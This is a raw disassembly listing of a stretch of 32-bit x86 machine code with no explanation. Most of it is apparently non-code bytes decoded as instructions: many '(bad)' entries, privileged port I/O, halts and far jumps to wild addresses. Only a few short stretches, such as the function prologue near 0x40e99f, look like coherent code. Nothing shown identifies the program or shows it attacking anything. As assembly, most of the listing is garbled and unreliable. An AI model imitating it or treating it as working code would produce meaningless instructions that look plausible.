  40e4ee:	scas   al,BYTE PTR es:[edi]
  40e4ef:	mov    cl,0xcc
  40e4f1:	adc    eax,esi
  40e4f3:	mov    ds:0x8bd82c0,al
  40e4f8:	sub    ecx,DWORD PTR [edi-0x5059dc80]
  40e4fe:	rol    BYTE PTR [edi],cl
  40e500:	int    0x65
  40e502:	pusha  
  40e503:	xchg   ebp,eax
  40e504:	add    eax,0xc8b48dcf
  40e509:	dec    esi
  40e50a:	adc    DWORD PTR [esi-0x3f],edi
  40e50d:	add    ebp,ecx
  40e50f:	and    al,0xaf
  40e511:	jmp    0xac727e22
  40e516:	push   edx
  40e517:	xchg   DWORD PTR [ebx],edi
  40e519:	pop    ebx
  40e51a:	int3   
  40e51b:	mov    bl,al
  40e51d:	pusha  
  40e51e:	fsub   QWORD PTR [eax+eiz*8-0x4ea76db]
  40e525:	imul   esp,esp,0xffffff89
  40e528:	jne    0x40e4de
  40e52a:	ins    DWORD PTR es:[edi],dx
  40e52b:	adc    DWORD PTR [esi+0x2c],0xffffff93
  40e52f:	xor    DWORD PTR [ecx-0x49],edx
  40e532:	add    cl,bl
  40e534:	jnp    0x40e4f6
  40e536:	or     al,0xf6
  40e538:	mul    BYTE PTR [ebx-0x5a]
  40e53b:	jae    0x40e4eb
  40e53d:	sahf   
  40e53e:	inc    eax
  40e53f:	push   ecx
  40e540:	or     DWORD PTR [ecx-0x5],edx
  40e543:	sti    
  40e544:	pop    edx
  40e545:	xchg   edi,eax
  40e546:	cwde   
  40e547:	xchg   ebx,eax
  40e548:	(bad)  
  40e54a:	imul   ebp,DWORD PTR [ecx-0x5a],0xffffffd0
  40e54e:	pop    ecx
  40e54f:	push   ss
  40e550:	ins    DWORD PTR es:[edi],dx
  40e551:	into   
  40e552:	in     eax,dx
  40e553:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e554:	ins    BYTE PTR es:[edi],dx
  40e555:	rol    esp,1
  40e557:	shl    BYTE PTR [edi-0x1abdfc52],cl
  40e55d:	out    0xe1,eax
  40e55f:	lahf   
  40e560:	pop    ecx
  40e561:	dec    esi
  40e562:	hlt    
  40e563:	aaa    
  40e564:	sub    al,0x7e
  40e566:	out    dx,al
  40e567:	jne    0x40e56d
  40e569:	adc    al,0xce
  40e56b:	jnp    0x40e5c6
  40e56d:	cld    
  40e56e:	jbe    0x40e53e
  40e570:	sbb    al,0xf6
  40e572:	mov    esi,0xb7218450
  40e577:	pop    es
  40e578:	adc    eax,DWORD PTR [edi-0x43]
  40e57b:	sub    DWORD PTR [ebx+ebx*8+0x7d],esi
  40e57f:	ffree  st(4)
  40e581:	(bad)  
  40e582:	cs (bad) 
  40e585:	and    edx,0xffffffa3
  40e588:	fwait
  40e589:	add    BYTE PTR [edi-0x7e1de335],0xd9
  40e590:	sub    al,0x0
  40e592:	cmp    esp,DWORD PTR [edx]
  40e594:	es xchg ebp,eax
  40e596:	bound  edx,QWORD PTR [ebx]
  40e598:	push   ss
  40e599:	sbb    DWORD PTR gs:[ebp+0x4],0xdf6951fc
  40e5a1:	push   ss
  40e5a2:	outs   dx,DWORD PTR ds:[esi]
  40e5a3:	(bad)  
  40e5a4:	adc    ah,BYTE PTR [eax+0x45]
  40e5a7:	or     al,0xb7
  40e5a9:	adc    dl,BYTE PTR [esi]
  40e5ab:	and    esp,DWORD PTR [edx*4+0x523571d9]
  40e5b2:	pop    ebx
  40e5b3:	sti    
  40e5b4:	test   al,0xb
  40e5b6:	mov    BYTE PTR [ecx+0x31],0xb6
  40e5ba:	pop    edi
  40e5bb:	in     al,0xf4
  40e5bd:	inc    esi
  40e5be:	retf   
  40e5bf:	dec    edx
  40e5c0:	fld    TBYTE PTR [ebx+esi*1]
  40e5c3:	dec    ebp
  40e5c4:	sbb    BYTE PTR es:[ebx],cl
  40e5c7:	bnd jle 0x40e5eb
  40e5ca:	(bad)  
  40e5cb:	ins    DWORD PTR es:[edi],dx
  40e5cc:	add    dh,bh
  40e5ce:	mov    BYTE PTR [edi-0x56],bl
  40e5d1:	pop    eax
  40e5d2:	lahf   
  40e5d3:	cmp    eax,0x13a8376a
  40e5d8:	cmp    bh,BYTE PTR [eax+0x68]
  40e5db:	or     al,0x35
  40e5dd:	add    DWORD PTR [ebx+0x24],0x2c
  40e5e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5e2:	inc    edi
  40e5e3:	cmp    BYTE PTR [esi-0x39d0701d],bl
  40e5e9:	sub    eax,0x9bc2c464
  40e5ee:	xor    dh,BYTE PTR [ecx]
  40e5f0:	rcr    BYTE PTR [eax-0x63],cl
  40e5f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5f4:	mov    ds:0xd1dd73a2,eax
  40e5f9:	rcr    DWORD PTR [edx+0x29],1
  40e5fc:	lock outs dx,DWORD PTR ds:[esi]
  40e5fe:	inc    eax
  40e5ff:	jg     0x40e58f
  40e601:	aad    0x50
  40e603:	sar    BYTE PTR [ebp+ebx*4-0x14],cl
  40e607:	call   0xc595:0x7e23bb52
  40e60e:	out    0x23,al
  40e610:	(bad)  
  40e611:	dec    esi
  40e612:	and    BYTE PTR [ecx+edx*8],0x20
  40e616:	and    eax,0xe3a08c1e
  40e61b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e61c:	mov    ?,ebp
  40e61e:	stos   BYTE PTR es:[edi],al
  40e61f:	mov    ah,0x6
  40e621:	sbb    edx,esp
  40e623:	pop    ss
  40e624:	data16 ficom WORD PTR [edx+0x6e]
  40e628:	jbe    0x40e5f6
  40e62a:	pop    ss
  40e62b:	or     BYTE PTR ds:0x33d1b7c2,al
  40e631:	mov    al,0x90
  40e633:	cmc    
  40e634:	xlat   BYTE PTR ds:[ebx]
  40e635:	fs mov edx,0x716c7d46
  40e63b:	sbb    al,0xe3
  40e63d:	(bad)  
  40e63e:	loopne 0x40e5dd
  40e640:	xchg   ebp,eax
  40e641:	xor    BYTE PTR [eax+0x2006184e],0xee
  40e648:	les    esi,FWORD PTR [ecx+0x1a]
  40e64b:	sahf   
  40e64c:	jno    0x40e617
  40e64e:	jg     0x40e6bc
  40e650:	jns    0x40e687
  40e652:	mov    edi,fs
  40e654:	cs cli 
  40e656:	cmp    esi,DWORD PTR [ecx*2-0x1fd8ad81]
  40e65d:	dec    esi
  40e65e:	cmp    ebx,ebp
  40e660:	test   eax,0x37dd5836
  40e665:	and    bh,BYTE PTR [esi-0x41]
  40e668:	ins    BYTE PTR es:[edi],dx
  40e669:	es xor al,0xe
  40e66c:	inc    esi
  40e66d:	call   0xe2f74183
  40e672:	stc    
  40e673:	daa    
  40e674:	aas    
  40e675:	adc    eax,0xfa2adbcc
  40e67a:	test   ch,0x43
  40e67d:	pusha  
  40e67e:	cwde   
  40e67f:	leave  
  40e680:	sub    al,0xf
  40e682:	mov    al,0x98
  40e684:	icebp  
  40e685:	inc    ebp
  40e686:	dec    ebp
  40e687:	shl    DWORD PTR [esi+0x1b9cdcb8],cl
  40e68d:	jno    0x40e665
  40e68f:	aad    0x9a
  40e691:	(bad)  
  40e692:	repz mov eax,ds:0x68b40a9c
  40e698:	push   eax
  40e699:	out    dx,eax
  40e69a:	cmp    ah,BYTE PTR [edi+0x3b133f69]
  40e6a0:	shr    DWORD PTR [eax+0x50566efd],0xbb
  40e6a7:	xchg   ebp,eax
  40e6a8:	pop    ebx
  40e6a9:	rcl    DWORD PTR [edi],0x4e
  40e6ac:	and    ecx,esp
  40e6ae:	je     0x40e6f3
  40e6b0:	mov    ah,0x32
  40e6b2:	in     al,0x2
  40e6b4:	out    dx,al
  40e6b5:	fistp  WORD PTR [ebx]
  40e6b7:	inc    ebx
  40e6b8:	cmp    eax,0xb3683e57
  40e6bd:	out    dx,eax
  40e6be:	jl     0x40e714
  40e6c0:	mov    edx,0xfb1cff61
  40e6c5:	sbb    al,0xeb
  40e6c7:	cmp    al,0x8f
  40e6c9:	mov    BYTE PTR [ecx+esi*1+0x6f],ah
  40e6cd:	jmp    0xbb5305e6
  40e6d2:	and    BYTE PTR [eax],0xcd
  40e6d5:	(bad)
  40e6d8:	jmp    0x493a6e37
  40e6dd:	out    0xe6,al
  40e6df:	xchg   edx,eax
  40e6e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6e1:	mov    bh,0x9f
  40e6e3:	add    eax,0xbb21f522
  40e6e8:	mov    ebx,0x187e4cf5
  40e6ed:	mov    ds:0xd97a3750,al
  40e6f2:	(bad)  
  40e6f3:	fistp  DWORD PTR [esi-0x5b]
  40e6f6:	inc    edi
  40e6f7:	add    al,0xbc
  40e6f9:	in     al,0xb0
  40e6fb:	inc    esi
  40e6fc:	mov    esi,0x3c63353
  40e701:	ret    
  40e702:	mov    DWORD PTR [ebp+0x8],eax
  40e705:	mov    eax,ds:0x41eae6
  40e70a:	mov    DWORD PTR [ebp+0x8],eax
  40e70d:	mov    eax,DWORD PTR [ebp-0x14]
  40e710:	mov    DWORD PTR [ebp-0x4],eax
  40e713:	mov    eax,DWORD PTR [ebp-0x4]
  40e716:	push   0x4
  40e718:	pop    ecx
  40e719:	sub    ecx,eax
  40e71b:	add    ecx,DWORD PTR [ebp-0x18]
  40e71e:	mov    DWORD PTR [ebp-0x8],ecx
  40e721:	jmp    0x40e979
  40e726:	(bad)
  40e729:	(bad)  
  40e72a:	leave  
  40e72b:	fcmovbe st,st(5)
  40e72d:	sar    esp,1
  40e72f:	rcr    DWORD PTR [esp+edi*1],1
  40e732:	cmp    bh,BYTE PTR [ecx-0x44c00290]
  40e738:	js     0x40e7b2
  40e73a:	xor    eax,0xb78787e
  40e73f:	push   edi
  40e740:	aad    0x87
  40e742:	daa    
  40e743:	pop    edi
  40e744:	cmp    DWORD PTR [ebp-0x46],ebp
  40e747:	fwait
  40e748:	repz enter 0x2740,0xeb
  40e74d:	xchg   ecx,eax
  40e74e:	rdpmc  
  40e750:	loopne 0x40e71d
  40e752:	jecxz  0x40e71f
  40e754:	pushf  
  40e755:	and    DWORD PTR [ecx+esi*1+0x58],esp
  40e759:	sub    bh,bl
  40e75b:	jbe    0x40e76c
  40e75d:	mov    esp,0xbabfd60f
  40e762:	mov    ebx,0xad2f0ea1
  40e767:	leave  
  40e768:	xchg   DWORD PTR [ebx-0x7a],esp
  40e76b:	ret    
  40e76c:	popa   
  40e76d:	pop    eax
  40e76e:	ins    DWORD PTR es:[edi],dx
  40e76f:	or     al,0x74
  40e771:	stos   BYTE PTR es:[edi],al
  40e772:	int    0x5f
  40e774:	lock push es
  40e776:	fistp  DWORD PTR [edx+esi*1-0x1916c230]
  40e77d:	sub    ah,BYTE PTR [ecx-0x4a]
  40e780:	or     ecx,ecx
  40e782:	ins    DWORD PTR es:[edi],dx
  40e783:	push   edi
  40e784:	lahf   
  40e785:	jae    0x40e7a8
  40e787:	cmc    
  40e788:	sti    
  40e789:	jg     0x40e7d4
  40e78b:	mov    bh,0x4e
  40e78d:	pusha  
  40e78e:	cmp    BYTE PTR [edi-0x36358c10],0x3
  40e795:	jle    0x40e793
  40e797:	mov    al,0x11
  40e799:	int3   
  40e79a:	daa    
  40e79b:	xchg   ebp,eax
  40e79c:	addr16 hlt 
  40e79e:	retf   
  40e79f:	outs   dx,BYTE PTR ds:[esi]
  40e7a0:	aas    
  40e7a1:	lahf   
  40e7a2:	mov    bh,0x1
  40e7a4:	leave  
  40e7a5:	ror    DWORD PTR ds:0xf789b681,1
  40e7ab:	and    al,0x11
  40e7ad:	dec    ebp
  40e7ae:	enter  0x1a16,0xaf
  40e7b2:	xchg   ebp,eax
  40e7b3:	mov    eax,ds:0x16910d5b
  40e7b8:	aaa    
  40e7b9:	outs   dx,BYTE PTR ds:[esi]
  40e7ba:	bound  esp,QWORD PTR ds:0x345864c4
  40e7c0:	pusha  
  40e7c1:	inc    ebx
  40e7c2:	add    eax,0x859ef4ec
  40e7c7:	pop    edx
  40e7c8:	scas   eax,DWORD PTR es:[edi]
  40e7c9:	imul   BYTE PTR [esi]
  40e7cb:	add    al,0x52
  40e7cd:	or     eax,0x1c7881ee
  40e7d2:	pop    edx
  40e7d3:	cld    
  40e7d4:	pop    eax
  40e7d5:	push   0xffffffc8
  40e7d7:	test   eax,ebx
  40e7d9:	jo     0x40e827
  40e7db:	jns    0x40e7dc
  40e7dd:	cld    
  40e7de:	xchg   esi,eax
  40e7df:	xor    al,0x2c
  40e7e1:	inc    edx
  40e7e2:	push   ecx
  40e7e3:	or     ebp,DWORD PTR [ebx]
  40e7e5:	adc    al,0x6
  40e7e7:	ss jbe 0x40e799
  40e7ea:	sub    BYTE PTR [edx+esi*4-0x64],ah
  40e7ee:	add    al,0x41
  40e7f0:	mov    ah,0xad
  40e7f2:	dec    eax
  40e7f3:	sbb    DWORD PTR es:[ebx+eiz*8+0x33e90f21],edx
  40e7fb:	mov    ds:0xfa6cbcd9,eax
  40e800:	fistp  DWORD PTR [esi-0x80]
  40e803:	shl    DWORD PTR [edi+0x4914ab1b],1
  40e809:	clc    
  40e80a:	mov    esp,eax
  40e80c:	data16 add al,0x15
  40e80f:	cmp    DWORD PTR [ebx+0x543fb3c9],0xffffffc9
  40e816:	fadd   DWORD PTR gs:[ecx-0x3c67e20b]
  40e81d:	call   0x1c59b990
  40e822:	jl     0x40e821
  40e824:	or     ecx,DWORD PTR [ecx+0xe467139]
  40e82a:	cmp    bh,al
  40e82c:	cs and al,0x36
  40e82f:	ret    0xd510
  40e832:	mov    dl,0x2
  40e834:	pop    es
  40e835:	data16 and al,0xb8
  40e838:	repnz mov cs:0xf51b1390,eax
  40e83f:	ror    DWORD PTR [edi-0x51],1
  40e842:	dec    ebp
  40e843:	push   ecx
  40e844:	dec    esi
  40e845:	xor    ebp,eax
  40e847:	cmp    DWORD PTR [bp-0x4060],esi
  40e84c:	push   edi
  40e84d:	js     0x40e8b6
  40e84f:	sub    al,0xc8
  40e851:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e852:	jle    0x40e81b
  40e854:	scas   al,BYTE PTR es:[edi]
  40e855:	fs data16 jmp 0x40e890
  40e859:	mov    ah,0x8d
  40e85b:	stos   DWORD PTR es:[edi],eax
  40e85c:	push   ecx
  40e85d:	add    eax,0x849d5f99
  40e862:	nop
  40e863:	cwde   
  40e864:	mov    dl,0xea
  40e866:	xor    al,BYTE PTR [eax+0x34155922]
  40e86c:	or     DWORD PTR [edx],esp
  40e86e:	push   ebx
  40e86f:	and    eax,0x794478b8
  40e874:	out    0xef,al
  40e876:	fs or  eax,0xff4c8787
  40e87c:	or     BYTE PTR [ecx-0x64],0xf8
  40e880:	test   ebx,esp
  40e882:	push   ebx
  40e883:	fdivr  DWORD PTR [ebx+ebx*2+0x31041ee2]
  40e88a:	xlat   BYTE PTR ds:[ebx]
  40e88b:	dec    esi
  40e88c:	in     eax,0x71
  40e88e:	adc    DWORD PTR [edi+0x3d],0x11
  40e892:	sub    BYTE PTR [ebp-0x2c],ah
  40e895:	cmp    esi,DWORD PTR [eax-0xc]
  40e898:	cmp    al,0x53
  40e89a:	mov    ecx,0x3e774a94
  40e89f:	iret   
  40e8a0:	outs   dx,DWORD PTR ds:[esi]
  40e8a1:	in     eax,dx
  40e8a2:	(bad)  
  40e8a3:	mov    bh,0x7c
  40e8a5:	jb     0x40e904
  40e8a7:	and    eax,0x668a9bb3
  40e8ac:	cld    
  40e8ad:	es dec ecx
  40e8af:	xor    bl,BYTE PTR [esi+0x134e49c2]
  40e8b5:	inc    eax
  40e8b6:	pop    ebx
  40e8b7:	ret    
  40e8b8:	lds    ebx,FWORD PTR [edi+0x32]
  40e8bb:	xchg   esi,eax
  40e8bc:	fldcw  WORD PTR [ecx+0x5f0a3142]
  40e8c2:	das    
  40e8c3:	jne    0x40e85d
  40e8c5:	push   cs
  40e8c6:	fnstsw WORD PTR [ebp-0x47]
  40e8c9:	aam    0x21
  40e8cb:	jl     0x40e88b
  40e8cd:	mov    WORD PTR [edx],gs
  40e8cf:	cmp    BYTE PTR [ebx-0x27],dl
  40e8d2:	push   ebp
  40e8d3:	jbe    0x40e89d
  40e8d5:	cwde   
  40e8d6:	and    eax,0x52ef0dc1
  40e8db:	mov    BYTE PTR [ebp+0x1c0e3e80],cl
  40e8e1:	les    esp,FWORD PTR [ebx]
  40e8e3:	dec    edi
  40e8e4:	sbb    ah,bl
  40e8e6:	pop    ebp
  40e8e7:	push   ds
  40e8e8:	iret   
  40e8e9:	mov    esp,0x5e098b95
  40e8ee:	xchg   ebx,eax
  40e8ef:	cdq    
  40e8f0:	adc    eax,DWORD PTR [edx+0x386f9430]
  40e8f6:	ror    cl,cl
  40e8f8:	and    eax,0x9143e5f9
  40e8fd:	jae    0x40e912
  40e8ff:	not    DWORD PTR [ebx+eiz*2+0x7b4f2aaa]
  40e906:	rcr    DWORD PTR [ebx-0x3f7a99b3],0xc
  40e90d:	leave  
  40e90e:	push   0xcec7cb34
  40e913:	dec    esi
  40e914:	push   cs
  40e915:	jb     0x40e912
  40e917:	push   0xffffffd6
  40e919:	xchg   esp,eax
  40e91a:	ss dec edi
  40e91c:	pop    ds
  40e91d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e91e:	repnz add DWORD PTR [edi],edx
  40e921:	neg    ebp
  40e923:	scas   al,BYTE PTR es:[edi]
  40e924:	mov    eax,ebp
  40e926:	mov    es,WORD PTR [edi+eax*4+0x6d]
  40e92a:	in     al,dx
  40e92b:	aam    0x3a
  40e92d:	or     eax,0xbb6ab059
  40e932:	inc    edi
  40e933:	xchg   dl,ch
  40e935:	or     esp,eax
  40e937:	adc    ch,ch
  40e939:	iret   
  40e93a:	adc    BYTE PTR [edx],0xdb
  40e93d:	out    0x92,eax
  40e93f:	or     DWORD PTR [ecx],esp
  40e941:	repnz bound ecx,QWORD PTR [ebx-0x1e11c4ea]
  40e948:	add    ch,bl
  40e94a:	cld    
  40e94b:	mov    edi,DWORD PTR [eax+0x5e]
  40e94e:	rcr    BYTE PTR [ebp+0x24],1
  40e951:	ficomp DWORD PTR [ecx+0xa]
  40e954:	dec    esp
  40e955:	test   BYTE PTR [esi+0x7d],ch
  40e958:	adc    edx,DWORD PTR [esi+ecx*1-0x3110c9e]
  40e95f:	or     DWORD PTR [edi+0x53],ecx
  40e962:	in     eax,0xc1
  40e964:	lea    ebx,[ebx]
  40e966:	dec    edi
  40e967:	pop    es
  40e968:	jno    0x40e9d4
  40e96a:	mov    bh,0x65
  40e96c:	std    
  40e96d:	xchg   DWORD PTR [eax+0x7a5d3001],ecx
  40e973:	bound  esp,QWORD PTR [ebp+ecx*4-0x747e5fd9]
  40e97a:	inc    ebp
  40e97b:	or     al,0x33
  40e97d:	(bad)  
  40e97e:	lea    edi,[edi+eax*1+0x327298]
  40e985:	cmp    edi,0x50a
  40e98b:	jne    0x40d51f
  40e991:	mov    eax,DWORD PTR [ebp+0xc]
  40e994:	pop    edi
  40e995:	xor    eax,esi
  40e997:	pop    esi
  40e998:	add    eax,ebx
  40e99a:	pop    ebx
  40e99b:	leave  
  40e99c:	ret    0x8
  40e99f:	push   ebp
  40e9a0:	mov    ebp,esp
  40e9a2:	sub    esp,0x44
  40e9a5:	push   edi
  40e9a6:	mov    eax,DWORD PTR [ebp+0xc]
  40e9a9:	mov    DWORD PTR [ebp-0x10],eax
  40e9ac:	mov    eax,DWORD PTR [ebp+0x8]
  40e9af:	and    DWORD PTR ds:0x42a7f1,0x0
  40e9b9:	mov    edx,DWORD PTR ds:0x42a7f1
  40e9bf:	inc    edx
  40e9c0:	mov    DWORD PTR ds:0x42a7f1,edx
  40e9c6:	cmp    DWORD PTR ds:0x42a7f1,0x6
  40e9cd:	jne    0x40e9dc
  40e9d3:	push   DWORD PTR [ebp-0x28]
  40e9d6:	call   DWORD PTR ds:0x41d250
  40e9dc:	cmp    DWORD PTR ds:0x42a7f1,0x5
  40e9e3:	jne    0x40e9f6
  40e9e9:	mov    edx,DWORD PTR ds:0x42a7f1
  40e9ef:	inc    edx
  40e9f0:	mov    DWORD PTR ds:0x42a7f1,edx
  40e9f6:	cmp    DWORD PTR ds:0x42a7f1,0x10
  40e9fd:	jb     0x40e9b9
  40ea03:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  40ea0a:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40ea11:	jmp    0x40ec99
  40ea16:	cmp    eax,0xd6ce3ed7
  40ea1b:	aad    0xcd
  40ea1d:	xlat   BYTE PTR ds:[ebx]
  40ea1e:	jecxz  0x40e9ce
  40ea20:	ja     0x40e9b6
  40ea22:	or     al,0x49
  40ea24:	push   esi
  40ea25:	stc    
  40ea26:	hlt    
  40ea27:	mov    ecx,0x7ee57878
  40ea2c:	js     0x40eaa6
  40ea2e:	retf   0x8e08
  40ea31:	ret    0xe7d6
  40ea34:	add    edx,esi
  40ea36:	ret    0x24f3
  40ea39:	popf   
  40ea3a:	pop    ecx
  40ea3b:	test   ecx,ebx
  40ea3d:	inc    esp
  40ea3e:	dec    esi
  40ea3f:	and    al,0x37
  40ea41:	jecxz  0x40ea7e
  40ea43:	inc    edi
  40ea44:	xchg   ebx,eax
  40ea45:	pop    ebx
  40ea46:	or     BYTE PTR [ebp+ebp*4+0x59056b01],bh
  40ea4d:	(bad)  
  40ea4e:	inc    ebx
  40ea4f:	jmp    0x3c69681b
  40ea54:	pop    esi
  40ea55:	aas    
  40ea56:	ret    0xb08d
  40ea59:	cwde   
  40ea5a:	cmp    ch,BYTE PTR [ecx+0x2b]
  40ea5d:	mov    ebx,0xb6ef488a
  40ea62:	imul   eax,DWORD PTR [ebx+0x7d],0xbfcf432
  40ea69:	ins    DWORD PTR es:[edi],dx
  40ea6a:	sub    esi,edi
  40ea6c:	or     eax,0x6d5c80cd
  40ea71:	push   eax
  40ea72:	cs rcr bl,cl
  40ea75:	xchg   al,al
  40ea77:	sbb    eax,0x5349fc19
  40ea7c:	push   ds
  40ea7d:	imul   ecx,DWORD PTR [ebp+0x34],0x4d812f64
  40ea84:	je     0x40ea55
  40ea86:	pop    edx
  40ea87:	sti    
  40ea88:	or     BYTE PTR [ebx-0x4],dh
  40ea8b:	sub    eax,ebx
  40ea8d:	rcr    ebx,0x21
  40ea90:	mov    eax,ds:0xe1be8e48
  40ea95:	add    eax,0xd78910d9
  40ea9a:	cmp    eax,0xf05b55c6
  40ea9f:	test   ebp,eax
  40eaa1:	cmp    eax,0xba71ef64
  40eaa6:	cmp    DWORD PTR [eax+0x1],edi
  40eaa9:	adc    bh,BYTE PTR [edi-0x5adc1985]
  40eaaf:	es (bad) 
  40eab1:	or     al,0x84
  40eab3:	bswap  ebp
  40eab5:	jb     0x40ea3b
  40eab7:	outs   dx,DWORD PTR ds:[esi]
  40eab8:	lahf   
  40eab9:	jb     0x40eac9
  40eabb:	gs and eax,0x4807bdef
  40eac1:	jmp    0xeddd:0x605be24f
  40eac8:	shl    DWORD PTR [esi],1
  40eaca:	(bad)  [edx+0xa9fe814]
  40ead0:	test   BYTE PTR [ecx],dh
  40ead2:	gs mov ebp,0x86682e3c
  40ead8:	(bad)  
  40ead9:	nop
  40eada:	sub    esi,DWORD PTR [eax]
  40eadc:	pusha  
  40eadd:	cli    
  40eade:	lods   eax,DWORD PTR ds:[esi]
  40eadf:	cmp    al,0x21
  40eae1:	popf   
  40eae2:	and    al,0xb2
  40eae4:	and    eax,0xaffa3b5f
  40eae9:	bnd jmp 0x744e98bb
  40eaef:	mov    ecx,0x481574a6
  40eaf4:	icebp  
  40eaf5:	pop    ebp
  40eaf6:	and    DWORD PTR [esi],esp
  40eaf8:	cmp    DWORD PTR [esp+ecx*8-0x48],eax
  40eafc:	xchg   ah,dh
  40eafe:	sub    edi,DWORD PTR [ecx-0x8c6f665]
  40eb04:	mov    ebp,0x4a19113a
  40eb09:	gs retf 0x7f81
  40eb0d:	sbb    BYTE PTR [ecx],bh
  40eb0f:	ins    BYTE PTR es:[edi],dx
  40eb10:	lds    ebp,FWORD PTR [edi+0x67]
  40eb13:	rol    ebx,0xe0
  40eb16:	mov    ch,0x97
  40eb18:	xor    ecx,edx
  40eb1a:	stos   BYTE PTR es:[edi],al
  40eb1b:	add    eax,DWORD PTR [eax+edx*1-0x20]
  40eb1f:	inc    esi
  40eb20:	scas   al,BYTE PTR es:[edi]
  40eb21:	adc    eax,0x953ac224
  40eb26:	mov    ah,0x2d
  40eb28:	push   0xffffff8f
  40eb2a:	add    BYTE PTR [ecx],dh
  40eb2c:	aad    0x70
  40eb2e:	(bad)  
  40eb30:	mov    esi,0x60c3157e
  40eb35:	push   eax
  40eb36:	mov    ah,0x5e
  40eb38:	dec    ebx
  40eb39:	outs   dx,DWORD PTR ds:[esi]
  40eb3a:	imul   ebp,ebp,0x5bc01da9
  40eb40:	outs   dx,DWORD PTR ds:[esi]
  40eb41:	push   0x1f
  40eb43:	xchg   esp,eax
  40eb44:	jo     0x40eb41
  40eb46:	les    edi,FWORD PTR [eax+0x2f]
  40eb49:	xchg   ebp,eax
  40eb4a:	(bad)  
  40eb4b:	(bad)
  40eb4f:	pop    es
  40eb50:	xchg   edi,eax
  40eb51:	stc    
  40eb52:	jg     0x40eb44
  40eb54:	or     dl,BYTE PTR [ecx+0x1a587863]
  40eb5a:	fistp  DWORD PTR [ebp-0x1f]
  40eb5d:	push   cs
  40eb5e:	mov    ebp,0x2272fefe
  40eb63:	(bad)  
  40eb64:	sbb    eax,0x1ac1890a
  40eb69:	in     al,dx
  40eb6a:	dec    edi
  40eb6b:	adc    BYTE PTR [ebp+0x5c],bl
  40eb6e:	and    eax,0x927f2777
  40eb73:	push   eax
  40eb74:	mov    edi,?
  40eb76:	test   DWORD PTR es:[edx+0x11385d5],edi
  40eb7d:	sub    al,0xce
  40eb7f:	sbb    eax,0xba1137c6
  40eb84:	stc    
  40eb85:	mov    ebp,0xb9ef6634
  40eb8a:	sub    DWORD PTR [eax],edi
  40eb8c:	int    0xb0
  40eb8e:	mov    ebx,esp
  40eb90:	push   edx
  40eb91:	dec    esp
  40eb92:	mov    BYTE PTR [edx+ebp*1-0x43],bl
  40eb96:	outs   dx,BYTE PTR ds:[esi]
  40eb97:	mov    DWORD PTR [eax],esp
  40eb99:	outs   dx,DWORD PTR ds:[esi]
  40eb9a:	ficom  WORD PTR [edi-0x279a4343]
  40eba0:	shl    bl,1
  40eba2:	lea    edi,[edx-0x49]
  40eba5:	dec    ebx
  40eba6:	add    DWORD PTR [eax-0x6410c1d2],esp
  40ebac:	sbb    cl,BYTE PTR [ecx+0x2b]
  40ebaf:	pop    edx
  40ebb0:	jo     0x40eba9
  40ebb2:	clc    
  40ebb3:	pop    ebx
  40ebb4:	sub    DWORD PTR [edi+0x70d8efb2],edx
  40ebba:	retf   
  40ebbb:	sub    al,0xd8
  40ebbd:	cwde   
  40ebbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebbf:	sbb    BYTE PTR [ecx+ecx*8+0x3f7523fb],al
  40ebc6:	int    0x2e
  40ebc8:	scas   al,BYTE PTR es:[edi]
  40ebc9:	sar    edi,cl
  40ebcb:	sub    ebx,DWORD PTR [edi-0x5e]
  40ebce:	repnz sub dh,BYTE PTR [edx-0x13]
  40ebd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebd3:	iret   
  40ebd4:	sub    DWORD PTR [ecx+0x79],esi
  40ebd7:	test   al,0x8f
  40ebd9:	jo     0x40ebf2
  40ebdb:	ins    BYTE PTR es:[edi],dx
  40ebdc:	rcl    bh,cl
  40ebde:	js     0x40eb6a
  40ebe0:	repnz arpl WORD PTR [ebx+0x54],di
  40ebe4:	dec    ebp
  40ebe5:	xlat   BYTE PTR ds:[ebx]
  40ebe6:	mov    al,0xa9
  40ebe8:	xor    ecx,DWORD PTR [eax-0x48dc54bc]
  40ebee:	fcom   QWORD PTR [ebp-0x7ba4b4ff]
  40ebf4:	mov    dl,0x6b
  40ebf6:	fdivr  DWORD PTR [edx+0x9536f22]
  40ebfc:	ins    BYTE PTR es:[edi],dx
  40ebfd:	dec    ebp
  40ebfe:	and    BYTE PTR [eax+0x53],ah
  40ec01:	mov    ecx,0x87b57f74
  40ec06:	retf   0xa6d
  40ec09:	aaa    
  40ec0a:	rcl    al,cl
  40ec0c:	add    BYTE PTR [edi-0x25],cl
  40ec0f:	ja     0x40ebc7
  40ec11:	jb     0x40ebc3
  40ec13:	cmp    esi,DWORD PTR [eax+esi*1+0x75e84eaa]
  40ec1a:	cmp    eax,0x62d35b1f
  40ec1f:	sub    eax,0xba2fe45c
  40ec24:	cld    
  40ec25:	cmc    
  40ec26:	pop    ds
  40ec27:	jle    0x40ec74
  40ec29:	and    ecx,edi
  40ec2b:	popa   
  40ec2c:	pop    esi
  40ec2d:	mov    ds:0x55a9ad3e,al
  40ec32:	icebp  
  40ec33:	mov    ?,WORD PTR [ecx]
  40ec35:	arpl   WORD PTR [edi],ax
  40ec37:	ret    
  40ec38:	mov    ?,WORD PTR [edx]
  40ec3a:	pop    edi
  40ec3b:	loope  0x40ec2f
  40ec3d:	sahf   
  40ec3e:	mov    WORD PTR [esi],es
  40ec40:	clc    
  40ec41:	xchg   BYTE PTR [ebx],cl
  40ec43:	call   0x94a998b4
  40ec48:	sub    eax,0x64ab656f
  40ec4d:	fwait
  40ec4e:	stos   BYTE PTR es:[edi],al
  40ec4f:	sti    
  40ec50:	or     DWORD PTR [edi],ecx
  40ec52:	ins    DWORD PTR es:[edi],dx
  40ec53:	xor    BYTE PTR [ebx+0x584dcbc9],bl
  40ec59:	or     BYTE PTR [ebx],ah
  40ec5b:	push   ecx
  40ec5c:	pop    esp
  40ec5d:	arpl   WORD PTR [esi+ecx*8+0x688a495],si
  40ec64:	push   edi
